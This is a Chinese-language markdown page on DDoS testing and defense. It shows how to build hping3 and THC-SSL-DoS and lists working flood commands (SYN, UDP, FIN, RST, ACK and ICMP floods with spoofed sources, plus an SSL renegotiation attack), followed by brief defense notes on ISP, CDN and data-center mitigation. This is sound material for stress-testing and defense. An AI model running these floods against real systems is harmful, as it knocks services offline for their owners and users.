## 概述

## 利用工具
### hping3
[Hping3官网地址](http://www.hping.org/hping3.html)

* Centos7编译安装 ( Kali自带 )

```

# 解决环境依赖
yum install gcc.x86_64 libpcap-devel.x86_64 tcl-devel -y

# 下载
wget http://www.hping.org/hping3-20051105.tar.gz

# 解压并开始编译
tar -xf hping3-20051105.tar.gz && cd hping3-20051105
./configure

# 报错如图
```

![ddos-1](https://github.com/bloodzer0/Enterprise_Security_Build--Open_Source/blob/master/Infrastructure%20Security/Network%20Security/DoS%20DDoS%20CC/img/ddos-1.png)

```
# 修改文件，解决问题，修改如图
vim bytesex.h
```

![ddos-2](https://github.com/bloodzer0/Enterprise_Security_Build--Open_Source/blob/master/Infrastructure%20Security/Network%20Security/DoS%20DDoS%20CC/img/ddos-2.png)

```
# 编译，此时报错如图
make
```

![ddos-3](https://github.com/bloodzer0/Enterprise_Security_Build--Open_Source/blob/master/Infrastructure%20Security/Network%20Security/DoS%20DDoS%20CC/img/ddos-3.png)

```
# 解决问题
ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h

# 再次编译
make && make instal

# 安装成功
```

* hping3案例

```
# 测试SYN Flood
hping3 -S --flood -V -p PORT IP
hping3 -c 20000 -d 120 -S -w 64 -p PORT --flood --rand-source IP # 随机源IP

# 测试UDP Flood
hping3 --flood --rand-source --udp -p PORT IP

# 测试TCP FIN Flood
hping3 --flood --rand-source -F -p PORT IP

# 测试TCP RST Flood
hping3 --flood --rand-source -R -p PORT IP

# 测试PUSH和ACK Flood
hping3 --flood --rand-source -PA -p PORT IP

# 测试ICMP和IGMP Flood
hping3 --flood --rand-source -1 -p PORT IP
```

### Thc-SSL-DoS
* Centos7编译安装 ( kali自带 )

```
# 解决环境依赖
yum install gcc.x86_64 openssl-devel.x86_64 -y

# 下载
git clone git://git.kali.org/packages/thc-ssl-dos.git && cd thc-ssl-dos

# 编译安装
./configure

make && make install
```

* thc-ssl-doS使用

```
thc-ssl-dos -l 500 IP PORT --accept
```

## 防御
本质：网络层面的DDoS攻击是无法防御的，能做的就是不断优化自身的网络架构，以及提升网络带宽。

### 链路带宽

### ISP/WAN层
电信云堤产品提供"流量压制"和"近源清洗"：

```
流量压制：分方向的黑洞路由

近源清洗：
```

### CDN/Internet层
CDN本身不是抗DDoS产品，但是针对Web服务而言，CDN可以提供一定的抗D效果。

### DC层
DataCenter这一层的防御属于近目的清洗，在DC出口的地方部署ADS设备。

### OS/APP层
更多的是落地在CC防御中，[参考链接](https://github.com/bloodzer0/Enterprise_Security_Build--Open_Source/blob/master/Infrastructure%20Security/Network%20Security/DoS%20DDoS%20CC/CC.md)
